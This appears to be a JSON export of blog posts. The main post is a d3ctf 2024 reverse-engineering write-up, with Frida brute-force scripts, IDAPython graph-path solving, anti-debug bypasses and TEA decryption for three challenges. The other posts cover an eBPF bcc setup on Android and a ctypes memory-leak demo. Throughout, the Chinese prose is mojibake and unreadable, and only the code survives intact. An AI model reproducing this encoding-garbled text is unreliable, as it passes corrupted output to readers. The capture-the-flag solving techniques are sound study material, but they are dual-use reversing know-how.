installéšåå†ç¼–è¯‘ä¸€ä¸‹ python çš„ bcc cmake -DPYTHON_CMD=python3 ..pushd src/python/makemake installpopdè¯•è¯•çœ‹å®˜æ–¹çš„ä¾‹å­ python3 bcc/examples/hello_world.pyç»“æœç«Ÿç„¶æ²¡è¾“å‡ºï¼Ÿ å“ˆå“ˆï¼ŒåŸæ¥æ˜¯ tracing çš„å¼€å…³æ²¡å¼€ï¼Œå¼€ä¸€ä¸‹ echo 1 > /sys/kernel/tracing/tracing_onHello, World! # å‚è€ƒèµ„æ–™ eBPF on Android ä¹‹ bcc ç¯å¢ƒå‡†å¤‡ â€”â€”eadb åŸç‰ˆ [åŸåˆ›] 60 ç§’å­¦ä¼šç”¨ eBPF-BCC hook ç³»ç»Ÿè°ƒç”¨ ( 2 ) hook å®‰å“æ‰€æœ‰ syscall eBPF on Android ä¹‹ bcc ç¼–è¯‘ä¸ä½“éªŒ","categories":[],"tags":[]},{"title":"d3ctf2024 reverse wp","slug":"d3ctf-2024","date":"2024-04-28T16:12:07.000Z","updated":"2024-04-29T05:12:39.705Z","comments":true,"path":"d3ctf-2024/","link":"","permalink":"https://oacia.dev/d3ctf-2024/","excerpt":"","text":"# å‰è¨€ å·²ç»æ˜¯å››æœˆåº•äº†ï¼Œä½†æ˜¯å´çªç„¶å‘ç°è¿™ä¸€æ•´ä¸ªæœˆéƒ½æ²¡æœ‰åœ¨åšå®¢å†™äº›ä»€ä¹ˆï¼Œæ„Ÿè§‰åˆæ˜¯åœ¨ä¸æ˜æ‰€ä»¥ä¸­åº¦è¿‡äº†ï¼Œæƒ³çœ‹çš„ magisk , frida æºç æ²¡æœ‰çœ‹å®Œï¼Œæƒ³åšçš„å°å¤çš„ live2d ä¹Ÿè¿Ÿè¿Ÿæ²¡æœ‰åŠ¨å·¥ï¼Œä¸‹ä¸ªæœˆåŠªåŠªåŠ›ï¼Œå¤šå­¦ç‚¹ï¼Œå¤šåšç‚¹ï¼ŒåŠ æ²¹åŠ æ²¹ æ€»è§‰å¾—è‡ªå·±è¿˜æ˜¯è¦å†™ä¸‹ç‚¹ä»€ä¹ˆæ‰å¥½ï¼Œæ°å¥½è¿™å‘¨å¬é—»æœ‰ä¸ª d3ctf, äºæ˜¯ä¾¿æƒ³æ¥çœ‹çœ‹é€†å‘é¢˜ï¼Œå»å­¦ä¹ ä¸€ä¸‹æ–°çŸ¥è¯†å¼€æ‹“è§†é‡ï¼ŒåŒæ—¶ä¹Ÿä¸ºäº†åº¦è¿‡ä¸€æ®µå……å®çš„å‘¨æœ«æ—¶å…‰ å›æƒ³å»å¹´çš„ d3ctf, æ„Ÿè§‰é‚£æ—¶çš„è‡ªå·±æœ‰å¤ªå¤šä¸äº†è§£çš„åœ°æ–¹äº†ï¼Œäºæ˜¯ä¹æƒ…ç†ä¹‹ä¸­çš„ä¹Ÿæ˜¯ä¸€é¢˜éƒ½æ²¡åšå‡ºæ¥äº†ï¼Œå¤ç°çš„é¢˜ç›®çš„è®¡åˆ’åœ¨æˆ‘çš„ todolist é‡Œé¢èººäº†å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œç„¶è€Œä¸çŸ¥ä¸è§‰é—´å˜æˆäº† undo, æœ€ååˆ°ç°åœ¨çš„ forget do,never do åŒæ—¶æˆ‘ä¹Ÿæƒ³æ¥çœ‹çœ‹ä¸€ä¸‹è¿™ä¸€å¹´çš„è‡ªå·±æœ‰äº†ä»€ä¹ˆå˜åŒ–ï¼Œæ„Ÿè§‰ç°åœ¨å¯ä»¥ç§°è‡ªå·±æ˜¯ä¸€ä½å…¥é—¨é€†å‘å·¥ç¨‹å¸ˆäº†å§å“ˆå“ˆå“ˆï¼Œæ€»å…±äº”é“é€†å‘é¢˜åšå¥½äº†ä¸‰é¢˜ï¼Œå¯æƒœå‘¨æ—¥å› ä¸ºè¦è°ƒä¼‘çš„ç¼˜æ•… (è°å‘æ˜çš„è°ƒä¼‘ï¼Ÿï¼) ä¾¿æ²¡æœ‰å†ç»§ç»­çœ‹é¢˜äº†ï¼Œé¢˜ç›®æŒºä¸é”™çš„ï¼Œä¸è¿‡è¦æ˜¯å¯ä»¥æœ‰å®‰å“é¢˜çš„è¯æˆ‘åº”è¯¥ä¼šæœ‰ç™¾åˆ†ä¹‹ä¸‰ç™¾çš„ç²¾æ°”ç¥å»åšå§ ^.^ ç¿»äº†ç¿»è‡ªå·±è¿‡å»å†™çš„ ctf æ–‡ç« ï¼Œé‚£ä¹Ÿä»…ä»…æ˜¯ wp å‡ºä¸ª flag è€Œå·²ï¼Œä½†æ˜¯ flag ä¸æ˜¯é¢˜ç›®çš„ç»ˆç‚¹ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶ä¸­è•´è—çš„æŠ€å·§ï¼Œæ‰‹æ³•æ‰æ˜¯çœŸæ­£å€¼å¾—æ€»ç»“ä¸€ç¯‡æ–‡ç« çš„åœ°æ–¹ï¼Œæˆ‘å¯ä¸å¸Œæœ›è‡ªå·±å†™çš„æ–‡ç« åœ¨æœªæ¥è¿æˆ‘è‡ªå·±éƒ½ä¸æ„¿é‡æ–°ç¿»çœ‹ (â—Ë‡âˆ€Ë‡â—) é¢˜ç›®é™„ä»¶ç‚¹è¿™é‡Œä¸‹è½½ï½ # forest å¾ˆå¥½çš„ä¸€é“é¢˜ï¼Œå°† MSVC çš„ SEH å¼‚å¸¸å¤„ç†ä½¿ç”¨çš„ååˆ†å·§å¦™ï¼ŒåŒæ—¶ç‚¹å’Œå›¾çš„æ€æƒ³ä¹Ÿåœ¨è¿™é¢˜æœ‰äº†å……åˆ†çš„ä½“ç°ï¼Œåœ¨åšè¿™é¢˜çš„æ—¶å€™æœ‰ä¸€ä¸ªå¤±è´¥çš„è§£æ³•ï¼Œä¸è¿‡æˆ‘æ„Ÿè§‰å¾ˆæœ‰æ„æ€æ‰€ä»¥ä¹Ÿåœ¨è¿™é‡Œè®°å½•ä¸‹æ¥å•¦ è¿™é‡Œä½ ä¼šçœ‹åˆ°åœ°å€éƒ½æ˜¯ 61 å¼€å¤´ï¼Œé‚£æ—¶å› ä¸ºç”¨ od çš„æ—¶å€™é‡Œé¢çš„åŸºå€å°±æ˜¯ 0x610000 , æ‰€ä»¥å½“æ—¶ä¸ºäº†å’Œ ida ä¸­å¯¹åº”èµ·æ¥æˆ‘ä¹Ÿæ”¹æˆäº† 61 å¼€å¤´ï¼Œä¸è¿‡æœ€å od è¿˜æ˜¯æ²¡æœ‰æ’ä¸Šç”¨åœºå…¨é  ida åŠ¨æ€è°ƒè¯•å•¦ è¿™é‡Œé€šè¿‡ä¸»åŠ¨è®¾ç½® int 3 æ–­ç‚¹è§¦å‘ 0x80000003 æ–­ç‚¹å¼‚å¸¸è¿›å…¥ sub_611A00 åœ¨ sub_611A00 ä¸­ï¼Œå¯¹å¼‚å¸¸ç è¿›è¡Œåˆ¤æ–­ï¼Œè¿™é‡Œå¯ä»¥é‡å®šä¹‰ this å‚æ•°ç±»å‹ä¸º _EXCEPTION_POINTERS , è¿™æ ·çœ‹èµ·æ¥æ›´æ–¹ä¾¿äº›ï¼Œæ„Ÿè§‰æ˜¯ä¸€ä¸ªå°å°çš„çªç ´å£å“¦ é¦–æ¬¡è§¦å‘æ–­ç‚¹å¼‚å¸¸ï¼Œè§£å¯†ç”± VirtualProtect åˆ†é…çš„å†…å­˜åœ°å€çš„å€¼ï¼Œå¹¶è®¾ç½® byte_616028 æ ‡å¿—ä¸º 0, ä¸‹ä¸€æ¬¡è§¦å‘æ–­ç‚¹å¼‚å¸¸å°†è§†ä¸º flag é”™è¯¯ï¼Œè¿›ç¨‹é€€å‡º è§£å¯†å®Œæˆåè®¾ç½® EIP, å¹¶é€šè¿‡ this-&gt;ContextRecord-&gt;EFlags |= 0x100 è®¾ç½®å•æ­¥è°ƒè¯•æ¨¡å¼ï¼Œä½¿æ ‡å¿—å¯„å­˜å™¨ç¬¬ 8 ä½ TF ä¸º 1 éšåç¨‹åºä¼šé€šè¿‡è°ƒç”¨ cli ç‰¹æƒæŒ‡ä»¤å®ç° shellcode çš„è·³è½¬ int 2Dh è¡¨ç¤º flag é”™è¯¯ # [å¤±è´¥] frida ä¾§ä¿¡é“ è¯´çš„é«˜å¤§ä¸Šä¸€ç‚¹å«ä¾§ä¿¡é“ï¼Œå®é™…ä¸Šå°±æ˜¯çˆ†ç ´å“ˆå“ˆå“ˆï¼Œæˆ‘è°ƒè¯•çš„æ—¶å€™å‘ç°æ¯ä¸€æ¬¡è¾“å…¥çš„ flag ä¸ä¸€æ ·ï¼Œè°ƒç”¨ cli ç‰¹æƒæŒ‡ä»¤è§¦å‘ 0xC0000096 çš„æ¬¡æ•°ä¹Ÿä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘å°±åœ¨æƒ³ï¼Œè¦æ˜¯æˆ‘å¯ä»¥ä¸€ä½ä¸€ä½çš„çˆ†ç ´ï¼Œé€šè¿‡åœ¨å¤„ç† 0xC0000096 å¼‚å¸¸çš„åœ°æ–¹ä¸‹æ–­ç‚¹ç»Ÿè®¡è°ƒç”¨æ¬¡æ•°ï¼Œç„¶åç„¶è°ƒç”¨æœ€å¤šçš„é‚£ä¸ªå­—ç¬¦ä½œä¸ºè¿™ä¸€ä½çš„ flag, é‚£ä¸å°±å¾—åˆ°æœ€åçš„ flag äº†å˜›ï½ æ‰€ä»¥è¿™å›ç”¨ä¸Šäº†æˆ‘çš„è€ä¼™è®¡ frida, æƒ³è¦é€šè¿‡ frida å®ç°çˆ†ç ´ï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨ frida çš„ python è„šæœ¬ï¼ŒåŒæ—¶è¾“å…¥ä¹Ÿä¸èƒ½å†æ˜¯ console.log , è€Œæ˜¯éœ€è¦ä½¿ç”¨ send å°†ç»“æœè¿”å›åˆ° python ä¸­å»åšå¤„ç† function my_hook() &#123; var module = Process.findModuleByName(exe_name); Interceptor.attach(module.base.add(0x1BDE), &#123; onEnter: function (args) &#123; if(this.context.eax.compare(0xC0000096)===0)&#123; count=count+1 //console.log(this.context.eax) //console.log(ptr(module.base.add(0xAD20).readS32()).readS32().toString(16)) //console.log(ptr(module.base.add(0xAD24).readS32()).readS32().toString(16)) send(count) &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125; );&#125;// d3ctf&#123;01234567890123456&#125;setImmediate(my_hook);è¿™ä¸ª python çš„ä»£ç è™½ç„¶å¾ˆç®€å•ä½†æ˜¯ä¹Ÿå·§å¦™ï¼Œå˜»å˜» import osimport subprocessimport fridaimport string#d3ctf&#123;0ut00431101002001&#125;def on_message(message, data): global max_count,max_ch,current_ch if message['type'] == 'send': if not max_count: max_count = int(message['payload']) max_ch = current_ch elif int(message['payload'])>max_count: max_count = message['payload'] max_ch = current_ch elif int(message['payload'])==max_count: print(f\"NOTE! &#123;max_ch&#125; and &#123;current_ch&#125; have the same max_count &#123;max_count&#125;\") elif message['type'] == \"error\": print(message[\"description\"]) print(message[\"stack\"]) print(message[\"fileName\"], \"line:\", message[\"lineNumber\"], \"colum:\", message[\"columnNumber\"])jscode = open(\"trace_forest.js\",\"rb\").read().decode()t_flag = list(\"d3ctf&#123;01234567890123456&#125;\")for i in range(6,23): max_count, max_ch = None,None break_flag = 0 for c in string.printable: current_ch = c t_flag[i] = c process = subprocess.Popen(\"forest.exe\", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True) session = frida.attach(\"forest.exe\") script = session.create_script(jscode) script.on('message', on_message) script.load() process.stdin.write(''.join(t_flag)) output, error = process.communicate() process.terminate() t_flag[i] = max_ch print(f\"&#123;''.join(t_flag)&#125;, max: &#123;max_count&#125;\")ä½†æ˜¯å¯æƒœçš„æ˜¯ç¨‹åºè·‘å®Œå‡ºæ¥äº†è¿™ä¸ª d3ctf&#123;0ut00431101002001&#125; , è™½ç„¶æ˜¯é”™çš„ä½†æ˜¯å›æ˜¾ä¸ä¸€æ ·äº† ^.^ è¿™ä½•å°ä¸æ˜¯ä¸€ç§èƒœåˆ©ï½ä¸è¿‡æ¢ä¸ªæ–¹æ³•å’¯ # [æˆåŠŸ] å›¾ ç‚¹ è·¯å¾„ å¦‚æœæƒ³è¦äº§ç”Ÿæ­£ç¡®çš„å›æ˜¾ï¼Œå¿…é¡»è§¦å‘ 0xC0000005 å¼‚å¸¸ è¾“å…¥çš„å­—ç¬¦ä¸²å°†ä¼šè¢«å…¨éƒ¨è½¬æ¢ä¸ºäºŒè¿›åˆ¶çš„å½¢å¼ï¼Œæ¯æ‰§è¡Œ cli ç‰¹æƒæŒ‡ä»¤è§¦å‘ 0xC0000096 å¼‚å¸¸åéƒ½ä¼šè¯»å–ä¸€ä½ å¦‚æœä¸º 0, åˆ™ä¸‹ä¸€æ¬¡è§¦å‘ 0x80000004 å•æ­¥è°ƒè¯•å¼‚å¸¸ä¸”å½“å‰æŒ‡ä»¤çš„åç§»é€»è¾‘ &amp;0x3F ç­‰äº 7 æ—¶ï¼Œå°†ä¼šè®©å½“å‰çš„ Eip åŠ ä¸Š 23 è¿›å…¥ä¸‹ä¸€ä¸ªå—çš„ä½ç½®ç”± unk_EAA720 å’Œ unk_EA8658 è¿›è¡Œæ§åˆ¶ï¼Œç®—æ³•ä¸º (unk_EAA720+unk_EA8658+(unk_EA8658&lt;&lt;4))&lt;&lt;6 è§‚å¯Ÿåå‘ç°è¿™æ˜æ˜¾å°±æ˜¯ä¸€ä¸ªå›¾å‘€ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ idapython æ‰¾åˆ°å›¾çš„æ‰€æœ‰è¾¹ # d3ctf&#123;0ut00431101002001&#125;import idautilsimport idcimport ida_bytesbase = 0x616035pattern = [\"B8 FF FF FF FF C7 00 ?? 00 00 00 B8 FF FF FF FF C7 00 ?? 00 00 00 FA\"]pl = [] # point listfor i in range(len(pattern)): cur_addr = 0x616035 end_addr = 0x616035 + 0x483D while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, idc.SEARCH_DOWN, pattern[i]) if cur_addr == idc.BADADDR: break else: a = ida_bytes.get_byte(cur_addr + 7) b = ida_bytes.get_byte(cur_addr + 18) pl.append(&#123; \"cur\": cur_addr, \"off\": (a + b + (b &lt;&lt; 4)) &lt;&lt; 6, \"s\": 0 &#125;) cur_addr = idc.next_head(cur_addr)pattern = [\"8B 00\"]for i in range(len(pattern)): cur_addr = 0x616035 end_addr = 0x616035 + 0x483D while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, idc.SEARCH_DOWN, pattern[i]) if cur_addr == idc.BADADDR: break else: # if cur_addr-(base+5) &amp;0x3F==7,eax->1, eip+23 pl.append(&#123; \"cur\": cur_addr, \"off\": cur_addr + 23 - base, \"s\": 1 &#125;) cur_addr = idc.next_head(cur_addr)print(pl)ç„¶åæ‰“å°ä¸€ä¸‹æ²¡æœ‰å¯¹åº”ç«¯ç‚¹çš„ç‚¹ï¼Œè¿™é‡Œåªæ˜¯éƒ¨åˆ†ï¼Œå®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šâ€¦ ä¹‹åä¸€ä¸ªä¸€ä¸ªè¯•è¿‡å»ï¼Œå°±æœ‰ flag äº† (ä¸ºä»€ä¹ˆä¸ç”¨ for å¾ªç¯å°è¯•æ‰€æœ‰å¯èƒ½çš„ç‚¹ï¼Œå› ä¸ºç”¨ for å¾ªç¯ all_simple_paths ä¸å‡ºç»“æœå‘œ) base = 0x616035pl = [...]# ida python çš„ç»“æœimport networkx as nxG = nx.DiGraph()for p in pl: G.add_node(p[\"cur\"])out_way = []for p in pl: if not p[\"s\"]: if G.has_node(base+p[\"off\"]): G.add_edge(p[\"cur\"],base+p[\"off\"]) else: if base+p['off']>0x616035 + 0x483D: print(f\"find a way out: &#123;hex(p['cur'])&#125; --> &#123;hex(base+p['off'])&#125;\") G.add_node(base+p['off']) G.add_edge(base,base+p['off']) out_way.append(base+p['off']) else: print(f\"no taget point: &#123;hex(p['cur'])&#125; --> &#123;hex(base + p['off'])&#125;\") out_way.append(base + p['off']) else: if G.has_node(p[\"cur\"]+2+23): G.add_edge(p[\"cur\"],p[\"cur\"]+2+23) if G.has_node(p[\"cur\"]+2): G.add_edge(p[\"cur\"], p[\"cur\"] + 2) else: print(\"ERRR\")start = 0x616035tem = []out = 0x616c0efor path in nx.all_simple_paths(G, source=start, target=out): tem.append(path) #print(tem) #print(len(tem[0])) pll = [] for t in tem[0]: for p in pl: if p[\"cur\"]==t: #print(p[\"cur\"],p[\"s\"]) pll.append(p) break start = True flag=\"\" for p in range(len(pll)): if p!=0: if not pll[p][\"s\"]: if pll[p][\"cur\"]-pll[p-1][\"cur\"]==2: flag+=\"0\" else: flag+=\"1\" for i in range(0,len(flag)//8): print(chr(int(flag[8*i:8*i+8],2)),end='')# ezjunk ä»æ•´ä¸ªç¨‹åºçš„å…¥å£ start å‡½æ•°å¼€å§‹åˆ†æï¼Œåœ¨æ‰§è¡Œ main å‡½æ•°å‰ï¼Œè¿˜ä¼šè°ƒç”¨ sub_401CC0 å‡½æ•° åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œä¼šå¯¹ sub_401550 è¿›è¡Œè°ƒç”¨ ä½†æ˜¯å´æ²¡æ³•ç›´æ¥åç¼–è¯‘ï¼Œæ—¢ç„¶æ˜¯æ ˆçš„é—®é¢˜ï¼ŒæŠŠ sub rsp, 30h nop æ‰å°±å¥½å•¦ æœ‰ä¸ªåè°ƒè¯•ï¼Œè¿‡ä¸€ä¸‹å°±å¥½äº† main å‡½æ•°çš„èŠ±æŒ‡ä»¤ä¹Ÿå¾ˆç®€å•ï¼Œå»ä¸€ä¸‹å°±çœ‹åˆ°é€»è¾‘å•¦ è¿›åˆ° sub_401917 é‡Œé¢ï¼Œåªæ˜¯ä¸€ä¸ª tea ç®—æ³• ä¹‹åå°±æ˜¯ä¸€ä¸ªç±»ä¼¼ crc çš„ç®—æ³• ä¸è¿‡åœ¨è°ƒè¯•çš„æ—¶å€™è¿˜æ˜¯ä¸èƒ½ç›´æ¥æŠŠèŠ±æŒ‡ä»¤ nop æ‰çš„ï¼Œå› ä¸ºè¿™é‡Œè¯»å–çš„æ˜¯ loc401A1C èŠ±æŒ‡ä»¤çš„æ±‡ç¼–ï¼Œå¦‚æœ nop æ‰å˜æˆ 90 çš„è¯ï¼Œtea çš„å¸¸æ•°å€¼ä¼šå‡ºé”™çš„ from ctypes import *def encrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0xff58f981 total = c_uint32(0xE8017300) for i in range(32): v0.value += (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) ^ 0x44 v1.value += (((v0.value &lt;&lt; 5) ^ (v0.value >> 6)) + v0.value) ^ ( total.value + key[(total.value >> 11) &amp; 3]) ^ 0x33 total.value -= delta return v0.value, v1.valuedef decrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0xff58f981 total = c_uint32(0xE8017300 - 32 * delta) for i in range(32): total.value += delta v1.value -= (((v0.value &lt;&lt; 5) ^ (v0.value >> 6)) + v0.value) ^ ( total.value + key[(total.value >> 11) &amp; 3]) ^ 0x33 v0.value -= (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) ^ 0x44 return v0.value, v1.value# testif __name__ == \"__main__\": # å¾…åŠ å¯†çš„æ˜æ–‡ï¼Œä¸¤ä¸ª 32 ä½æ•´å‹ï¼Œå³ 64bit çš„æ˜æ–‡æ•°æ® # fakeflag&#123;Is_there_anywhere_else&#125; # value = [0x5406CBB1, 0xA4A41EA2, 0x34489AC5, 0x53D68797, 0xB8E0C06F, 0x0259F2DB, 0x52E38D82, 0x595D5E1D] value = [0xB6DDB3A9, 0x36162C23, 0x1889FABF, 0x6CE4E73B, 0x0A5AF8FC, 0x21FF8415, 0x44859557, 0x2DC227B7] value = [c_uint(v) for v in value] for i in range(len(value)): for _ in range(32): if value[i].value&amp;1: value[i] = c_uint(((value[i].value ^ 0x84A6972F)//2) | 0x80000000)#2086826726 else: value[i] = c_uint((value[i].value//2)) value = [v.value for v in value] #for v in value: #print(hex(v)) # value = [] # å››ä¸ª keyï¼Œæ¯ä¸ªæ˜¯ 32bitï¼Œå³å¯†é’¥é•¿åº¦ä¸º 128bit key = [0x00005454, 0x00004602, 0x00004477, 0x00005E5E] v = [0, 0] for i in range(len(value) // 2): v[0], v[1] = value[2 * i], value[2 * i + 1] res = decrypt(v, key) print(f\"&#123;res[0].to_bytes(4, 'little').decode()&#125;&#123;res[1].to_bytes(4, 'little').decode()&#125;\", end='')# RandomVM VM é¢˜å‹ï¼Œä¸è¿‡ç®—æ˜¯æ¯”è¾ƒæ–¹ä¾¿çš„é‚£ç§çœŸæ­£ç”¨åˆ°çš„æŒ‡ä»¤ä¸æ˜¯å¾ˆå¤šï¼Œida trace åœ¨å…³é”®å‡½æ•° trace ä¸€ä¸‹ï¼Œä¸è¿‡æœ‰ä¸ª ptrace åè°ƒè¯•æ³¨æ„ä¸€ä¸‹å°±å¥½å•¦ syscall (0x65) ptrace åè°ƒè¯•ï¼Œè·³è¿‡è¿™æ¡æŒ‡ä»¤å°±å¥½äº† æ¯”è¾ƒé‡è¦çš„æœ‰è¿™äº›å‡½æ•° idapython trace ä¸€ä¸‹ #xorimport idcimport ida_bytesimport idaapiea = ida_bytes.get_byte(idaapi.get_imagebase()+0xB072)ecx=idc.get_reg_value(\"ECX\")eax=idc.get_reg_value(\"EAX\")print(f\"final[&#123;ea&#125;] = &#123;hex(ecx)&#125;^&#123;hex(eax)&#125; = &#123;hex(ecx^eax)&#125;\")#movimport idcimport ida_bytesimport idaapiea = ida_bytes.get_byte(idaapi.get_imagebase()+0xB072)eax=idc.get_reg_value(\"EAX\")print(f\"final[&#123;ea&#125;] = &#123;hex(eax)&#125;\")#circleRmovimport idcimport ida_bytesimport idaapiimport ctypesea = ida_bytes.get_byte(idaapi.get_imagebase()+0xB072)edx=idc.get_reg_value(\"EDX\")ecx=idc.get_reg_value(\"ECX\")%8res = ctypes.c_uint8(edx)if ecx!=0xffffffff: res = ctypes.c_uint8((res.value>>ecx) | (res.value&lt;&lt;(8-ecx)))else: res = ctypes.c_uint8(0)print(f\"final[&#123;ea&#125;] = &#123;hex(edx)&#125;>>&#123;ecx&#125; | &#123;hex(edx)&#125;&lt;&lt;&#123;8-ecx&#125; = &#123;hex(res.value)&#125;\")è¾“å…¥ 0123456789ab å¾—åˆ°è¾“å‡º final[0] = 0x0^0x30 = 0x30final[1] = 0x1final[1] = 0x30>>3 | 0x30&lt;&lt;5 = 0x6final[1] = 0x6^0x3 = 0x5final[1] = 0x5^0x31 = 0x34final[2] = 0x2final[2] = 0x31>>5 | 0x31&lt;&lt;3 = 0x89final[2] = 0x89^0x32 = 0xbbfinal[3] = 0x3final[3] = 0x32>>6 | 0x32&lt;&lt;2 = 0xc8final[3] = 0xc8^0x33 = 0xfbfinal[4] = 0x4final[4] = 0x33>>7 | 0x33&lt;&lt;1 = 0x66final[4] = 0x66^0x7 = 0x61final[4] = 0x61^0x34 = 0x55final[5] = 0x5final[5] = 0x34>>4 | 0x34&lt;&lt;4 = 0x43final[5] = 0x43^0x4 = 0x47final[5] = 0x47^0x35 = 0x72final[6] = 0x6final[6] = 0x35>>4 | 0x35&lt;&lt;4 = 0x53final[6] = 0x53^0x36 = 0x65final[7] = 0x7final[7] = 0x36>>7 | 0x36&lt;&lt;1 = 0x6cfinal[7] = 0x6c^0x7 = 0x6bfinal[7] = 0x6b^0x37 = 0x5cfinal[8] = 0x8final[8] = 0x37>>7 | 0x37&lt;&lt;1 = 0x6efinal[8] = 0x6e^0x38 = 0x56final[9] = 0x9final[9] = 0x38>>2 | 0x38&lt;&lt;6 = 0xefinal[9] = 0xe^0x39 = 0x37final[10] = 0xafinal[10] = 0x39>>4 | 0x39&lt;&lt;4 = 0x93final[10] = 0x93^0x61 = 0xf2final[11] = 0xbfinal[11] = 0x61>>4 | 0x61&lt;&lt;4 = 0x16final[11] = 0x16^0x62 = 0x74final[12] = 0xcfinal[12] = 0x62>>7 | 0x62&lt;&lt;1 = 0xc4final[12] = 0xc4^0x7 = 0xc3final[2] = 0xbb^0x34 = 0x8ffinal[3] = 0xfb^0x8f = 0x74final[4] = 0x55^0x74 = 0x21final[5] = 0x72^0x21 = 0x53final[6] = 0x65^0x53 = 0x36final[7] = 0x5c^0x36 = 0x6afinal[8] = 0x56^0x6a = 0x3cfinal[9] = 0x37^0x3c = 0xbfinal[10] = 0xf2^0xb = 0xf9final[11] = 0x74^0xf9 = 0x8dfinal[12] = 0xc3^0x8d = 0x4eexp å¦‚ä¸‹ import ctypesdef circleR_rev(s, r): res = ctypes.c_uint8(s) res = ctypes.c_uint8((res.value &lt;&lt; r) | (res.value >> (8 - r))) return res.valuekey = [0x9D, 0x6B, 0xA1, 0x02, 0xD7, 0xED, 0x40, 0xF6, 0x0E, 0xAE, 0x84, 0x19]circle_R = [3, 5, 6, 7, 4, 4, 7, 7, 2, 4, 4, 7]xor = [3,0,0,7,4,0,7,0,0,0,0,7]flag = [0 for _ in range(12)]for i in range(len(key)-1,-1,-1): if not flag[-1]: flag[i] = circleR_rev(key[i]^key[i-1]^xor[i],circle_R[i]) else: flag[i] = circleR_rev(key[i]^key[i-1]^xor[i]^flag[i+1],circle_R[i]) if not i: flag[i] = circleR_rev(key[i]^xor[i]^flag[i + 1], circle_R[i])print(''.join(map(chr, flag)))","categories":[],"tags":[]},{"title":"è®°ä¸€æ¬¡python ctypes.castå¼•èµ·çš„å†…å­˜æ³„æ¼","slug":"python-memory-leak","date":"2024-03-02T07:00:00.000Z","updated":"2024-03-06T08:51:13.212Z","comments":true,"path":"python-memory-leak/","link":"","permalink":"https://oacia.dev/python-memory-leak/","excerpt":"","text":"å†…å­˜æ³„æ¼ï¼ˆè‹±è¯­ï¼šmemory leakï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­çš„ä¸€ç§èµ„æºæ³„æ¼ï¼Œä¸»å› æ˜¯è®¡ç®—æœºç¨‹åºçš„å†…å­˜ç®¡ç†å¤±å½“ [1]ï¼Œå› è€Œå¤±å»å¯¹ä¸€æ®µå·²åˆ†é…å†…å­˜ç©ºé—´çš„æ§åˆ¶ï¼Œç¨‹åºç»§ç»­å ç”¨å·²ä¸å†ä½¿ç”¨çš„å†…å­˜ç©ºé—´ï¼Œæˆ–æ˜¯å­˜å‚¨å™¨æ‰€å­˜å‚¨ä¹‹å¯¹è±¡æ— æ³•é€è¿‡æ‰§è¡Œä»£ç è€Œè®¿é—®ï¼Œä»¤å†…å­˜èµ„æºç©ºè€— [2]ã€‚ ç›¸ä¿¡æ¯ä¸€ä¸ªæ•²è¿‡ä»£ç çš„æœ‹å‹è‚¯å®šéƒ½é‡åˆ°è¿‡å†…å­˜æ³„æ¼ï¼Œå¯¹äº c è¯­è¨€è¿™ç§åˆ†é…äº†å†…å­˜å´ä¸ä¼šè‡ªå·±é‡Šæ”¾çš„è¯­è¨€æ¥è¯´ï¼Œå†…å­˜æ³„æ¼ç®—æ˜¯å®¶å¸¸ä¾¿é¥­äº†ï¼Œä½†æ˜¯æˆ‘æœ€è¿‘åœ¨å†™ä¸€ä¸ª python ä»£ç çš„æ—¶å€™åŒæ ·ä¹Ÿé‡åˆ°äº†å†…å­˜æ³„æ¼ï¼Œæœ‰æœ‹å‹å¯èƒ½ä¼šé—®ï¼Œpython è¿™ç§è‡ªå¸¦å†…å­˜å›æ”¶æœºåˆ¶çš„è¯­è¨€æ€ä¹ˆè¿˜ä¼šå†…å­˜æ³„æ¼å‘¢ï¼Ÿ çœŸç›¸æ˜¯â€¦ æˆ‘åœ¨ python ä¸­è°ƒç”¨äº† c ç¼–è¯‘å‡ºæ¥çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç„¶åå°±å†…å­˜æ³„æ¼äº†ï¼Œè€Œä¸”è¿™ä¸ªæ³„æ¼ç‚¹è—å¾—ç›¸å½“ä¹‹æ·±ï¼Œæˆ‘æ’æŸ¥äº†æ•´æ•´ä¸€æ•´å¤©æ‰æ‰¾åˆ° -_-! # demo ä¸‹é¢æ˜¯æœ‰å†…å­˜æ³„æ¼çš„ä»£ç çš„ demo, è¿™ä¸ªä»£ç å®ç°çš„åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨ main.py ä¸­è°ƒç”¨ double.dll çš„å¯¼å‡ºå‡½æ•° double_string , å®ç°çš„åŠŸèƒ½æ˜¯ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›çš„å­—ç¬¦ä¸²æ˜¯ä¼ å…¥å­—ç¬¦ä¸²çš„ä¸¤å€ï¼Œç„¶è€Œå†…å­˜å´åœ¨ä¸æ–­çš„å¢å¤§ # double.c //gcc -fPIC -shared double.c -o double.dll#include &lt;stdlib.h>#include &lt;string.h>#include &lt;stdio.h>unsigned char *double_string(unsigned char *input,int len)&#123; unsigned char* double_input = malloc(2*len+1); strcpy(double_input, input); strcat(double_input, input); return double_input;&#125;# main.py # main.pyimport ctypesdll = ctypes.CDLL('./double.dll')c_double_string = dll.double_stringc_double_string.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.c_int]c_double_string.restype = ctypes.POINTER(ctypes.c_uint8)def call_C_func(_data: bytes) -> bytes: data = ctypes.create_string_buffer(_data) data = ctypes.cast(data, ctypes.POINTER(ctypes.c_uint8)) ret = c_double_string(data, len(_data)) _ret = ctypes.string_at(ret, len(_data) * 2) return _retwhile True: call_C_func(b\"abcd\")# 